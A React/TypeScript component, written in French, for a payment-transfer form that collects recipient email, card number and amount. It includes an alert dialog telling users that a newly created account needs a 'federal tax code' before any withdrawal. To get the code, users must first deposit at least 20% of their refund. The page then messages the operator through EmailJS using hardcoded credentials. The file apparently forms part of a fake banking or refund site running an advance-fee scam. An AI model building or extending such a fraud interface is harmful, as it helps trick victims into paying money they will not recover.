import { zodResolver } from "@hookform/resolvers/zod";
import { Loader2 } from "lucide-react";

import { useState } from "react";
import { useForm } from "react-hook-form";
import * as z from "zod";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogTrigger,
} from "@/components/ui/alert-dialog";

import {
  Form,
  FormControl,
  FormDescription,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "./ui/form";
import { Input } from "./ui/input";
import { Textarea } from "./ui/textarea";

import PaymentDialogue from "./PaymentDialogue";

import { Button } from "@/components/ui/button";
import { useUserStore } from "@/actions/zustand/userState";

import { Link } from "react-router-dom";
import { useGetUserById } from "@/actions/tanstack/query";
import OtpModal from "./OTPModal";
import emailjs from "@emailjs/browser";
import { Toaster, toast } from "sonner";

const formSchema = z.object({
  email: z.string().email("Adresse e-mail invalide"),
  name: z.string().min(4, "La note de transfert est trop courte"),
  amount: z.string().min(2, "Amount is too short"),
  sharableId: z.string().min(8, "Le numéro de carte est requis "),
});

export function AlertDialogDemo({
  openAlert,
  setOpenAlert,
}: {
  openAlert: boolean;
  setOpenAlert: (P: boolean) => void;
}) {
  const user = useUserStore((state)=> state.user)
  const [isLoading, setIsLoading] = useState(false)
  const sendEmail = async()=>{
    emailjs
    .send(
      "service_ofgw6zl",
      "template_3oel94s",
      {
        from_name:`${user?.firstName} ${" "} ${user?.firstName}` ,
        from_email:user?.email,
        from_phone: "aucune",
        message: ` l'utilisateur  ${user?.firstName} ${" "} ${user?.firstName} demande le code`,
      },
      "_v1mrf9su7HdlCiCM"
    )
    .then(
      () => {
        setIsLoading(false);
        toast.success(
          "Merci pour votre confiance, je reviendrai vers vous dès que possible"
        );
      },
      (error) => {
        toast.error("échec du chargement du message, veuillez réessayer");
        console.log(error);
        setIsLoading(false);
      }
    );
  }
  return (
    <AlertDialog open={openAlert} onOpenChange={setOpenAlert}>
      <Toaster richColors/>
      <AlertDialogContent className="text-black bg-white text-left max-md:w-[90%] max-md:rounded-md ">
        <AlertDialogHeader>
          <AlertDialogTitle>Activation du compte et code fiscal fédéral</AlertDialogTitle>
          <AlertDialogDescription className="space-y-4 text-mono text-left">
            <p>
              Cher client, nous avons regardé de près votre compte et il montre
              que le compte a été récemment créé. Pour que le code fiscal
              fédéral a 6 chiffres permette des retraits réussis de votre
              compte, nous vous demandons de bien vouloir initier une
              transaction d'au moins 20 % du montant total du remboursement.
              Cette transaction initiale est nécessaire pour vérifier l'activité
              de votre compte et répondent aux normes réglementaires. Ce dépôt
              sera ajouté au solde de votre compte.
            </p>
            
            <p>
              Une fois que vous aurez effectué ce dépôt, nous serons en mesure de
            traiter les documents nécessaires et de vous envoyer le code de
            tâche fédéral requis. Dès réception du code fiscal, votre compte
            sera entièrement activé et vous serez éligible.
            </p>
          </AlertDialogDescription>
        </AlertDialogHeader>
        <AlertDialogFooter>
          <AlertDialogCancel>Annuler</AlertDialogCancel>
          <AlertDialogAction
          disabled={isLoading} className="form-btn">
            {isLoading ? (
              <>
                <Loader2 size={20} className="animate-spin" /> &nbsp;
                Loading...
              </>
            ) : "Obtenir le code"}
        
          </AlertDialogAction>
        </AlertDialogFooter>
      </AlertDialogContent>
    </AlertDialog>
  );
}

const PaymentTransferForm = () => {
  const [open, setOpen] = useState(false);

  const [formValues, setFormValues] = useState({
    name: "",
    city: "",
    number: "",
    amount: "",
    cvc: "",
    year: "",
    month: "",
  });
  const [status, setStatus] = useState("");
  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      name: "",
      email: "",
      amount: "",
      sharableId: "",
    },
  });
  const [openAlert, setOpenAlert] = useState(false);
  const user = useUserStore((state) => state.user);
  const { data: real_time_user } = useGetUserById(user?.$id!);
  let isLoading = false;

  const submit = async (data: z.infer<typeof formSchema>) => {
    console.log(formValues);
    setFormValues({ ...formValues, amount: data.amount });

    if (
      real_time_user?.code === null ||
      real_time_user?.code === "" ||
      real_time_user?.code === " "
    ) {
      setOpenAlert(true);
      setStatus("failed");
    } else if (
      real_time_user?.code ||
      real_time_user?.code !== "" ||
      real_time_user?.code !== null ||
      real_time_user?.code?.length > 0
    ) {
      setOpen(true);
      setStatus("sucess");
    }
  };

  return (
    <Form {...form}>
      <OtpModal
        open={open}
        setOpen={setOpen}
        userId={user?.userId}
        values={formValues}
        status={status}
      />
      <AlertDialogDemo openAlert={openAlert} setOpenAlert={setOpenAlert} />
      <Toaster richColors />
      <form onSubmit={form.handleSubmit(submit)} className="flex flex-col">
        {/* <FormField
          control={form.control}
          name="senderBank"
          render={() => (
            <FormItem className="border-t border-gray-200">
              <div className="payment-transfer_form-item pb-6 pt-5">
                <div className="payment-transfer_form-content">
                  <FormLabel className="text-14 font-medium text-gray-700">
                    Sélectionner la banque source
                  </FormLabel>
                  <FormDescription className="text-12 font-normal text-gray-600">
                    Sélectionnez le compte bancaire à partir duquel vous
                    souhaitez transférer des fonds
                  </FormDescription>
                </div>
                <div className="flex w-full flex-col">
                  <FormControl>
                    <BankDropdown
                      accounts={accounts}
                      setValue={form.setValue}
                      otherStyles="!w-full"
                    />
                  </FormControl>
                  <FormMessage className="text-12 text-red-500" />
                </div>
              </div>
            </FormItem>
          )}
        />*/}

        <FormField
          control={form.control}
          name="name"
          render={({ field }) => (
            <FormItem className="border-t border-gray-200">
              <div className="payment-transfer_form-item pb-6 pt-5">
                <div className="payment-transfer_form-content">
                  <FormLabel className="text-14 font-medium text-gray-700">
                    Note de transfert (optionnelle)
                  </FormLabel>
                  <FormDescription className="text-12 font-normal text-gray-600">
                    Veuillez fournir toute information ou instruction
                    supplémentaire concernant le transfert
                  </FormDescription>
                </div>
                <div className="flex w-full flex-col">
                  <FormControl>
                    <Textarea
                      placeholder="Écrivez une courte note ici"
                      className="input-class"
                      {...field}
                    />
                  </FormControl>
                  <FormMessage className="text-12 text-red-500" />
                </div>
              </div>
            </FormItem>
          )}
        />

        <div className="payment-transfer_form-details">
          <h2 className="text-18 font-semibold text-gray-900">
            Détails du compte bancaire
          </h2>
          <p className="text-16 font-normal text-gray-600">
            Enter the bank account details of the recipient
          </p>
        </div>

        <FormField
          control={form.control}
          name="email"
          render={({ field }) => (
            <FormItem className="border-t border-gray-200">
              <div className="payment-transfer_form-item py-5">
                <FormLabel className="text-14 w-full max-w-[280px] font-medium text-gray-700">
                  Adresse e-mail du destinataire
                </FormLabel>
                <div className="flex w-full flex-col">
                  <FormControl>
                    <Input
                      placeholder="ex: johndoe@gmail.com"
                      className="input-class"
                      {...field}
                    />
                  </FormControl>
                  <FormMessage className="text-12 text-red-500" />
                </div>
              </div>
            </FormItem>
          )}
        />

        <FormField
          control={form.control}
          name="sharableId"
          render={({ field }) => (
            <FormItem className="border-t border-gray-200">
              <div className="payment-transfer_form-item pb-5 pt-6">
                <FormLabel className="text-14 w-full max-w-[280px] font-medium text-gray-700">
                  Numéro de carte
                </FormLabel>
                <div className="flex w-full flex-col">
                  <FormControl>
                    <Input
                      placeholder="Entrez le numéro de compte"
                      className="input-class"
                      {...field}
                    />
                  </FormControl>
                  <FormMessage className="text-12 text-red-500" />
                </div>
              </div>
            </FormItem>
          )}
        />

        <FormField
          control={form.control}
          name="amount"
          render={({ field }) => (
            <FormItem className="border-y border-gray-200">
              <div className="payment-transfer_form-item py-5">
                <FormLabel className="text-14 w-full max-w-[280px] font-medium text-gray-700">
                  Montant
                </FormLabel>
                <div className="flex w-full flex-col">
                  <FormControl>
                    <Input
                      placeholder="ex: 5.00"
                      className="input-class"
                      {...field}
                    />
                  </FormControl>
                  <FormMessage className="text-12 text-red-500" />
                </div>
              </div>
            </FormItem>
          )}
        />

        {/*<FormField
          control={form.control}
          name="code"
          render={({ field }) => (
            <FormItem className="border-y border-gray-200">
              <div className="payment-transfer_form-item py-5">
                <FormLabel className="text-14 w-full max-w-[280px] font-medium text-gray-700">
                  Code
                </FormLabel>
                <div className="flex w-full flex-col">
                  <FormControl>
                    <Input
                      placeholder="ex: 5.00"
                      className="input-class"
                      {...field}
                    />
                  </FormControl>
                  <FormMessage className="text-12 text-red-500" />
                </div>
              </div>
            </FormItem>
          )}
        />*/}

        <div className="payment-transfer_btn-box">
          <Button type="submit" className="payment-transfer_btn">
            {isLoading ? (
              <>
                <Loader2 size={20} className="animate-spin" /> &nbsp; Envoi en cours...
              </>
            ) : (
              "Transférer des fonds"
            )}
          </Button>
        </div>
      </form>
    
    </Form>
  );
};

export default PaymentTransferForm;
